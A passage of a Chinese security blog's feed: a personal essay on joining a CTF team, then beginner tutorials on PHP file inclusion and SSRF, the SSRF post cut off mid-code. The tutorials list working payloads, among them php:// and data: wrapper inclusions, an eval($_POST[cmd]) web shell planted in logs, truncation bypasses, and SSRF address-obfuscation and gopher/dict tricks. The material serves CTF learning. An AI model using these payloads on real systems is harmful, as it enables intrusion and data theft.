/p>]]></content>
      
      
      <categories>
          
          <category> 安全小窝 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一位骚年的安全之路</title>
      <link href="/2024/06/16/%E4%B8%80%E4%BD%8D%E9%AA%9A%E5%B9%B4%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E8%B7%AF/"/>
      <url>/2024/06/16/%E4%B8%80%E4%BD%8D%E9%AA%9A%E5%B9%B4%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>​诸位安好，我是pax。这是安全小窝的第一篇文章，亦是我人生的第一篇公众号。实不相瞒，我思考了好一会，这么一篇极具意义的文章该写点啥嘞？Web知识，安全工具，还是专业普及？我突然拍腿！为什么不写写自己的学习和心路历程呢？ 开干！等等，我好像，似乎，应该，还不会写文章······</p><p>​</p><p>​23年的暑假，高考的肃穆被完结的钟声摧碎，盛夏的蝉鸣流淌在云端间隙。一个超常发挥的骚年选择了信息安全专业，命运的齿轮无息间上了润滑油。对于这个全然陌生的专业，骚年又能知道些什么呢？只能把抖音的只言片语堵满即将退化的大脑：</p><p>​“信息安全是个什么样的专业呢？”</p><p>​“好像是黑客！等等，什么，我竟然会成为黑客！”</p><p>​“好像，有点酷嘞！”</p><p>​“嘿嘿，薪资还不错，就决定是你了”</p><p>​</p><p>​胡思乱想，思绪同未来碰撞，隐约闪烁着一位少年的懵懂与期待：你好，未来！</p><p>​有时候你不得不问候命运，不管是亲切的还是悲切的。信息安全属于计算机大类，而我已经好久没碰过电脑了，就连洛克王国的宠物蛋都安详地瘫了数年，合理估计永远都醒不来了。</p><p>​有时候你又不得不感谢命运。我遇到了一位极好极好的引路人，我称呼他为“豆哥”。豆哥有多好，这是一件难以考证的事情（虽然但是才过去了一年）。</p><p>​</p><p>​咳咳，拉回即将扯偏的时间线。我有意了解过咱们专业的战队，也想赶紧学一点东西填脑子（当然绝对不是因为颓废了三个月）。有时缘分就是这么神奇，我QQ上填了豆哥的老家（那也是我待了十几年的地方），豆哥也因此了解到了我。从此，上了润滑油的齿轮开始飞动，一代Web佬中佬开始了他的传奇旅程（日常口嗨，万一成真了呢哈哈哈）。</p><p>​九月流火，军训折磨。流光在午休和晚休间跳跃，骚年一直对着记事本死敲HTML。熟练敲完HTML格式的骚年觉得自己天下无敌，却不知道原来还有vscode这样方便的IDE，从豆哥口中骚年学到了第一个道理：</p><p>​“懒惰是人类进步的动力。”</p><p>​骚年孤独吗，当时可没想那么多，如今回忆起却为他感到孤独。但是孤独是短暂的。或许是豆哥认同了骚年一直的努力，新名甜瓜的骚年认识了许多志同道合的同学。Wells，薯条，地雷······安全一途，日后请多多关照！</p><p>​这真让人记忆犹新，连ctf都不太了解的骚年被豆哥塞了一份西电题目，就好像还不会写字的小孩要当场作诗，你也觉得这很难评对吧！这还只是开胃小菜，一大堆的软件要下，一大堆环境变量要配，一大堆术语听不懂······</p><p>​</p><p>​当然，有一个人例外。Wells是唯一一个可以跟得上豆哥的man。他坚持认为他跟我们一样的基础，年少的我信了。可智慧如我，只需细细咂摸：</p><p>​“你在开什么国际玩笑！我们之间的差距不小于太平洋啊啊啊啊！”</p><p>​</p><p>​差距再大，还能再大。咳咳，但骚年还是有进步的。骚年按着豆哥的要求一步步埋头苦干，也算是入了Web的大门。中间有过狂妄，有过奔溃，有过欣喜，但唯一不变的是豆哥的耐心和同伴的共勉。我也好想写写做题时的奔溃和无奈，但是真要付诸笔端，也只有轻笑一声，任凭往事如风。</p><p>​有资格进入战队预备队的骚年满怀好奇，队伍不大（必须承认豆哥的魅力，这届Web人好多），但是联系紧密。战队最大的特点正是豆哥打动我们的地方：互帮互助，永不嫌弃！</p><p>​豆哥传承了战队的特点，我也必定将之传承。传承，也正是我创始这个公众号的初心和使命！</p><p>​最后，诸位安好！我叫pax，我会不定期分享有关安全的知识，向诸位献丑了。</p><p>​</p><p>​</p><p>​</p><p>​</p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> 安全小窝 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 感悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含入门</title>
      <link href="/2024/05/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/"/>
      <url>/2024/05/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="文件包含入门"><a href="#文件包含入门" class="headerlink" title="文件包含入门"></a>文件包含入门</h1><p>参考文章：<a href="https://blog.csdn.net/Fly_hps/article/details/80926992">PHP漏洞全解————10、PHP文件包含漏洞_action&#x3D;%252e%252e%255c%252e%252e%255c%252e%252e%25-CSDN博客</a></p><h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h2><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>必看：<a href="https://www.php.net/manual/zh/function.include.php">https://www.php.net/manual/zh/function.include.php</a></p><ul><li>include， require</li></ul><p>基础就不多说了，require报错会终止程序，但是include会继续执行下面代码。</p><ul><li>include_once &amp; require_once</li></ul><p>包含过的就不会继续包含</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><ul><li>具有相关的危险函数</li><li>包含变量可控</li></ul><h2 id="0x02-漏洞类型"><a href="#0x02-漏洞类型" class="headerlink" title="0x02 漏洞类型"></a>0x02 漏洞类型</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><blockquote><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。</p></blockquote><h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><blockquote><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。</p></blockquote><p>RFI对php.ini里的配置有些要求：</p><ul><li>allow_url_fopen &#x3D; On</li><li>allow_url_include &#x3D; On</li></ul><p><code>allow_url_fopen</code> 允许 PHP 读取远程文件，而 <code>allow_url_include</code> 则允许 PHP 在代码中包含远程文件。</p><blockquote><p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p></blockquote><h2 id="0x03-包含方法"><a href="#0x03-包含方法" class="headerlink" title="0x03 包含方法"></a>0x03 包含方法</h2><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>参考文章：<a href="https://we11s.github.io/posts/2344074049/#php-filter">https://we11s.github.io/posts/2344074049/#php-filter</a></p><blockquote><p>访问各个输入&#x2F;输出流(I&#x2F;O streams)，伪协议提供了多种不同的方式来访问和处理数据</p><p>在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>、<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行POST参数中的php代码。</p></blockquote><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>配置要求：</p><p>allow_url_fopen &#x3D; 无所谓</p><p>allow_url_include &#x3D; On</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GET</span></span><br><span class="line">?<span class="attribute">file</span>=php://input</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><blockquote><p><code>php://filter</code>可以作为一个位于原始数据流和最终目标之间的中间流来处理其他流，负责对数据进行处理。（即读取或写入数据之前对其进行修改或过滤。）</p></blockquote><p>配置要求：</p><p>allow_url_fopen &#x3D; 无所谓</p><p>allow_url_include &#x3D; 无所谓</p><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><ul><li><p>字符串过滤器：<a href="https://www.php.net/manual/zh/filters.string.php">PHP: 字符串过滤器 - Manual</a></p></li><li><p>转换过滤器：<a href="https://www.php.net/manual/zh/filters.convert.php">PHP: 转换过滤器 - Manual</a></p></li></ul><p>​常用：<code>convert.base64-encode</code>和<code> convert.base64-decode</code>（将字符串进行base64编码加解密）</p><p>​注：转换过滤器是 PHP 5.0.0 添加的</p><h5 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h5><p>exp：</p><p><code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>结构不难理解，头+过滤器+文件，将结果解码即可。</p><h3 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><blockquote><p>phar:&#x2F;&#x2F; 是用来解压的伪协议<br>phar:&#x2F;&#x2F;不管参数中是什么拓展名，都会被当做压缩包<br>用法：<code>?file=phar://压缩包/压缩文件</code><br>比如：<code>phar://xxx.png/shell.php</code><br><strong>利用phar:&#x2F;&#x2F; 时，PHP配置文件需要开启allow_url_fopen和allow_url_include，并且PHP版本要高于5.3.0</strong></p><p>写一个木马文件shell.php，然后用zip:&#x2F;&#x2F;伪协议压缩成shell.zip，最后修改后缀名为.png，上传图片<br>输入测试：<code>http://www.abc.com/xxx/file.php?file=phar://shell.png/shell.php</code></p><p>这样phar:&#x2F;&#x2F;就会将png当做zip压缩包进行解压，并且访问解压后的shell.php文件</p></blockquote><p>格式：<code>phar://压缩包/压缩文件</code>，前提是这个压缩包可控</p><h3 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><blockquote><p>和phar:&#x2F;&#x2F;伪协议原理类似，但用法不同<br>用法：<code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code><br><strong>利用zip:&#x2F;&#x2F; 时，PHP配置文件需要开启allow_url_fopen和allow_url_include，并且PHP版本要高于5.3.0</strong></p><p>注意：需要将#转换成URL编码：%23</p></blockquote><p>格式：zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名]</p><h3 id="expect"><a href="#expect" class="headerlink" title="expect:&#x2F;&#x2F;"></a>expect:&#x2F;&#x2F;</h3><p>不太好用，要安装拓展</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.<span class="keyword">com</span>/<span class="built_in">index</span>.php?page=php:expect://id</span><br><span class="line">http://example.<span class="keyword">com</span>/<span class="built_in">index</span>.php?page=php:expect://<span class="keyword">ls</span></span><br></pre></td></tr></table></figure><h3 id="data-URI，schema"><a href="#data-URI，schema" class="headerlink" title="data:URI，schema"></a>data:URI，schema</h3><p>利用条件：</p><ul><li>php版本大于等于php5.2</li><li>allow_url_fopen &#x3D; On</li><li>allow_url_include &#x3D; On</li></ul><p>方法一：</p><p><code>index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></p><p>方法二：</p><p><code>index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p><blockquote><p>加号 <code>+</code> 的url编码为 <code>%2b</code> ， <code>PD9waHAgcGhwaW5mbygpOz8+</code> 的base64解码为： <code>&lt;?php phpinfo();?&gt;</code></p></blockquote><h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>推荐文章：</p><p><a href="https://www.jianshu.com/p/e6f59f3f01b8%EF%BC%8C%E8%AF%A5%E6%96%87%E7%AB%A0%E8%AE%B2%E5%BE%97%E5%BE%88%E6%B7%B1%E5%88%BB%EF%BC%8C%E6%88%91%E5%8F%AA%E8%83%BD%E7%B2%97%E6%B5%85%E7%90%86%E8%A7%A3%E4%B8%80%E4%BA%9B">https://www.jianshu.com/p/e6f59f3f01b8，该文章讲得很深刻，我只能粗浅理解一些</a></p><p><a href="https://www.cnblogs.com/r1kka/p/15848498.html">ctfshow web82：利用session.upload_progress进行文件包含 - r1kka - 博客园 (cnblogs.com)</a>，这篇原理讲得很好</p><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><blockquote><p>该功能是在php5.4添加的，首先先了解下php.ini以下的几个默认选项</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">session.upload_progress.enable</span> = <span class="literal">on</span></span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">on</span></span><br><span class="line"><span class="attr">session.upload_progress.prefix</span> = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.name</span> = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br></pre></td></tr></table></figure><ul><li><code>enable = on</code>表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</li><li><code>cleanup = on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</li><li><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</li><li><code>prefix+name</code>将表示为session中的键名;</li><li>另外还有一个session配置中的重要选项：<code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。</li></ul></blockquote><p><code>cleanup</code>选项决定了我们需要条件竞争</p><blockquote><p>如果<code>session.auto_start=on</code>，则php会在接收请求的时候会自动初始化Session，不再需要执行<code>session_start()</code>。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，<code>session.use_strict_mode</code>默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;rikka，PHP将会在服务器上创建一个文件<code>/tmp/sess_rikka</code>。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有<code>ini.get(“session.upload_progress.prefix”)</code>+由我们构造的<code>session.upload_progress.name</code>值组成，最后被写入sess_文件里；</p><p>简而言之，我们自定义的PHPSESSID的值会变成文件名，比如定义PHPSESSID:rikka，文件名即为&#x2F;tmp&#x2F;sess_rikka，而PHP_SESSION_UPLOAD_PROGRESS的值即为该文件的内容</p></blockquote><p>简而言之，在Cookie对PHPSESSID赋值，可控文件名。</p><h4 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h4><h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><h4 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h4><p><a href="https://6a93bac8-4958-4014-aa48-1ad8e2c5f69a.challenge.ctf.show/">https://6a93bac8-4958-4014-aa48-1ad8e2c5f69a.challenge.ctf.show/</a>?&lt;?php eval($_POST[cmd]);</p><ul><li>要先知道日志位置：</li></ul><p>nginx：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>apache：&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access_log(access.log)</p><ul><li>payload插入：</li></ul><p>UA头，GET参数</p><p>UA头不需要抓包解码，GET参数需要。</p><p>最后getshell即可</p><h4 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h4><p>用户名不合法，气死我了</p><h3 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h3><p>包含的原理也不难</p><ul><li><p>找到写入点</p><p>UA头</p></li><li><p>找到包含地址</p><p><code>/proc/self/environ</code></p></li></ul><p>条件：</p><ul><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ul><h3 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h3><p>与包含environ类似，不过比较麻烦，之后做到再说</p><h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p>同样要竞争</p><h3 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h3><p>配合文件上传漏洞，基本原理不变</p><h3 id="其余"><a href="#其余" class="headerlink" title="其余"></a>其余</h3><p>需要深入理解文件包含，其他的应用未必不能文件包含，见招拆招，不断学习。</p><h2 id="0x04-绕过姿势"><a href="#0x04-绕过姿势" class="headerlink" title="0x04 绕过姿势"></a>0x04 绕过姿势</h2><p>实际上对于包含的文件名往往有限制，比如前缀和后缀等等。</p><p>参考文章：<a href="https://www.cnblogs.com/Zeker62/p/15322771.html#%E6%9C%89%E9%99%90%E5%88%B6%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">https://www.cnblogs.com/Zeker62/p/15322771.html#%E6%9C%89%E9%99%90%E5%88%B6%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB</a></p><h3 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h3><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>这个比较简单，不做多述。</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>有时把点号过滤了，尝试编码点号。</p><h3 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h3><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>URL格式在此处具有妙用，可以在payload最后加**?<strong>或者</strong>#<strong>，或者空格绕过</strong>%20**</p><h4 id="使用协议"><a href="#使用协议" class="headerlink" title="使用协议"></a>使用协议</h4><p>phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;都可以</p><h4 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h4><blockquote><p>利用条件： php版本 &lt; php 5.2.8</p><p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code>，则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p></blockquote><p>对路径进行修改即可，可以使用脚本（不会真的有人手搓吧哈哈哈）</p><h4 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h4><p>利用条件： php版本 &lt; php 5.3.4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phpinfo.txt%<span class="number">00</span></span><br></pre></td></tr></table></figure><h3 id="指定前后缀"><a href="#指定前后缀" class="headerlink" title="指定前后缀"></a>指定前后缀</h3><p>如果同时有前后缀，该怎么绕过呢？比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;/var/www/html/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;/test/test.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以使用目录遍历和长度截断（或者0字节截断），有必要的话可以对点号编码，至少协议和URL使用不了。</p><p>可知指定前缀的基础上很难使用URL方法，思路集中在路径上。</p><h2 id="0x05-防御方案"><a href="#0x05-防御方案" class="headerlink" title="0x05 防御方案"></a>0x05 防御方案</h2><ul><li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li><li>做好文件的权限管理</li><li>对危险字符进行过滤等等</li></ul><blockquote><p><code>open_basedir</code> 的主要作用是限制 PHP 脚本只能访问指定的目录及其子目录。这样，即使某个脚本存在漏洞，也无法访问超出这些限定目录之外的文件</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 文件包含 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF入门</title>
      <link href="/2024/05/26/SSRF%E5%85%A5%E9%97%A8/"/>
      <url>/2024/05/26/SSRF%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="SSRF入门"><a href="#SSRF入门" class="headerlink" title="SSRF入门"></a>SSRF入门</h1><h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><hr><h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p><hr><h2 id="0x02-SSRF危害"><a href="#0x02-SSRF危害" class="headerlink" title="0x02 SSRF危害"></a>0x02 SSRF危害</h2><p>1.内外网的端口和服务扫描</p><p>2.攻击运行在内网或本地的应用程序</p><p>3.对内网web应用进行指纹识别，识别企业内部的资产信息</p><p>4.攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）</p><p>5.利用file协议读取本地敏感数据文件等</p><hr><h2 id="0x03-造成SSRF的函数"><a href="#0x03-造成SSRF的函数" class="headerlink" title="0x03 造成SSRF的函数"></a>0x03 造成SSRF的函数</h2><p>SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。</p><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p><a href="https://www.php.net/manual/zh/function.file-get-contents.php">PHP: file_get_contents - Manual</a></p><blockquote><p>(PHP 4 &gt;&#x3D; 4.3.0, PHP 5, PHP 7, PHP 8)</p><p>file_get_contents — 将整个文件读入一个字符串</p></blockquote><p>这里可以用来获取远程数据，比如源码和图片。</p><h3 id="sockopen"><a href="#sockopen" class="headerlink" title="sockopen()"></a>sockopen()</h3><p><a href="https://www.php.net/manual/zh/function.fsockopen.php">PHP: fsockopen - Manual</a></p><blockquote><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p><p>fsockopen — 打开 Internet 或者 Unix 套接字连接</p></blockquote><p>简单来说就是：跟服务器建立tcp连接，传输原始数据。</p><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><p><a href="https://www.php.net/manual/zh/function.curl-exec.php">PHP: curl_exec - Manual</a></p><blockquote><p>(PHP 4 &gt;&#x3D; 4.0.2, PHP 5, PHP 7, PHP 8)</p><p>curl_exec — 执行 cURL 会话</p><p>这个函数应该在初始化 cURL 会话并且设置所有选项后调用。</p></blockquote><p>这个还是相当常见的</p><h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><p>一般来说，对于SSRF的限制在于对攻击者IP的限制（其要求发送者IP的合法性），这里需要绕过。</p><h3 id="IP进制改写"><a href="#IP进制改写" class="headerlink" title="IP进制改写"></a>IP进制改写</h3><p>若对IP进行正则过滤，可以通过改写IP形式来绕过</p><blockquote><p>对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：</p><ul><li>8进制格式：0300.0250.0.1</li><li>16进制格式：0xC0.0xA8.0.1</li><li>10进制整数格式：3232235521</li><li>16进制整数格式：0xC0A80001</li><li>合并后两位：1.1.278 &#x2F; 1.1.755</li><li>合并后三位：1.278 &#x2F; 1.755 &#x2F; 3.14159267</li></ul><p>另外IP中的每一位，各个进制可以混用。</p><p>访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。</p><p>另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。</p></blockquote><h3 id="使用解析到内网的域名"><a href="#使用解析到内网的域名" class="headerlink" title="使用解析到内网的域名"></a>使用解析到内网的域名</h3><blockquote><p>如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。</p><p>另外 <code>xip.io</code> 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1</p></blockquote><h3 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h3><blockquote><p>要求URL中必须包含<code>http://notfound.ctfhub.com</code>，来尝试利用URL的一些特殊地方绕过这个限制吧</p><p>构造payload：</p><p><code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code></p><p>如果要求以<code>http://notfound.ctfhub</code>开头<code>.com</code> 结尾的话，依旧可以使用@</p><p>payload</p><p><code>?url=http://notfound.ctfhub@127.0.0.1/flag.php.com</code></p><p>或者：</p><p><code>url=http://ctf.@127.0.0.1/flag.php#show</code></p></blockquote><p>此类需要某某开头 某某结束的题目均可使用@进行绕过。</p><h3 id="回环地址绕过"><a href="#回环地址绕过" class="headerlink" title="回环地址绕过"></a>回环地址绕过</h3><p>回环地址不止127.0.0.1，这便有了很大的操作空间</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0/flag.php</span><br><span class="line">url=http://sudo.cc/flag.php</span><br><span class="line">http://localhost/</span><br><span class="line"><span class="link">http://</span>[<span class="string">0:0:0:0:0:ffff:127.0.0.1</span>]/</span><br><span class="line">http://①②⑦.⓪.⓪.① </span><br></pre></td></tr></table></figure><h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>这个对程序的逻辑有要求</p><p>由于跳转的发起者是服务端，所以127.0.0.1自然也是服务端的本机。</p><p>需要自己搭个服务跳转</p><h3 id="利用URL伪协议"><a href="#利用URL伪协议" class="headerlink" title="利用URL伪协议"></a>利用URL伪协议</h3><h4 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h4><blockquote><p>通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL：</p></blockquote><p>我写过一篇博客：<a href="https://pax-pq.github.io/2024/05/18/Gopher%E5%85%A5%E9%97%A8/">https://pax-pq.github.io/2024/05/18/Gopher%E5%85%A5%E9%97%A8/</a></p><h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><p>读取文件很好用，exp：</p><p><code>file://var/www/html/flag.php</code></p><h4 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h4><blockquote><p>dict 协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，能用来探测端口的指纹信息<br>协议格式：<code>dict://&lt;host&gt;:&lt;port&gt;/&lt;dict-path&gt;</code><br>一般用<code>dict://&lt;host&gt;:&lt;port&gt;/info</code> 探测端口应用信息</p><p>举个栗子:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dict:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span> <span class="regexp">//</span>探测redis是否存活</span><br><span class="line">dict:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span><span class="regexp">/info /</span>/探测端口应用信息</span><br></pre></td></tr></table></figure></blockquote><h4 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h4><p>必看原理 -&gt; <a href="https://blog.csdn.net/mysteryflower/article/details/94386461">附件文章在这里</a></p><p>简单来说利用Gopherus编写FastCGI，可以实现任意命令执行</p><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span 